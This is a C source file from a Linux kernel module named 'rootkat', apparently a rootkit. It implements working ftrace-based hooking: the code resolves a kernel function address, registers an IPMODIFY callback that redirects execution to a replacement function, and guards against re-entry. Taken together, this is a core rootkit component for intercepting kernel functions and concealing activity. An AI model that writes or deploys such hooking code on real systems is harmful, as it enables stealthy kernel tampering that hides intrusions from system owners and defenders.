// SPDX-License-Identifier: MIT
#include <linux/ftrace.h>
#include <linux/kernel.h>
#include "ftrace_hook.h"
#include "resolver.h"

#define TAG "rootkat/ftrace: "

static void notrace rootkat_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                         struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct rootkat_hook *h = container_of(ops, struct rootkat_hook, ops);
	struct pt_regs *regs = ftrace_get_regs(fregs);

	/* Avoid re-entry from our own replacement. This is also the
	 * mechanism that makes `orig(...)` safe — when our replacement
	 * calls the original function pointer, parent_ip lands in our
	 * module and this guard short-circuits to running the original
	 * function body directly. */
	if (within_module(parent_ip, THIS_MODULE))
		return;

	regs->ip = (unsigned long)h->replacement;
}

int rootkat_hook_install_at(struct rootkat_hook *h, unsigned long addr)
{
	int rc;

	if (!addr) {
		pr_err(TAG "install_at: addr is 0\n");
		return -ENOENT;
	}
	h->target = addr;
	h->original = (void *)h->target;

	h->ops.func = rootkat_ftrace_thunk;
	h->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	             | FTRACE_OPS_FL_RECURSION
	             | FTRACE_OPS_FL_IPMODIFY;

	rc = ftrace_set_filter_ip(&h->ops, h->target, 0, 0);
	if (rc) {
		pr_err(TAG "ftrace_set_filter_ip: %d\n", rc);
		h->target = 0;   /* keep rootkat_hook_remove() idempotent */
		return rc;
	}

	rc = register_ftrace_function(&h->ops);
	if (rc) {
		pr_err(TAG "register_ftrace_function: %d\n", rc);
		ftrace_set_filter_ip(&h->ops, h->target, 1, 0);
		h->target = 0;
		return rc;
	}

	pr_debug(TAG "hooked %lx\n", h->target);
	return 0;
}

int rootkat_hook_install(struct rootkat_hook *h)
{
	unsigned long addr = rootkat_resolve(h->candidates, NULL);

	if (!addr) {
		pr_err(TAG "no target resolved\n");
		return -ENOENT;
	}
	return rootkat_hook_install_at(h, addr);
}

void rootkat_hook_remove(struct rootkat_hook *h)
{
	if (!h->target)
		return;
	unregister_ftrace_function(&h->ops);
	ftrace_set_filter_ip(&h->ops, h->target, 1, 0);
	pr_debug(TAG "unhooked %lx\n", h->target);
}
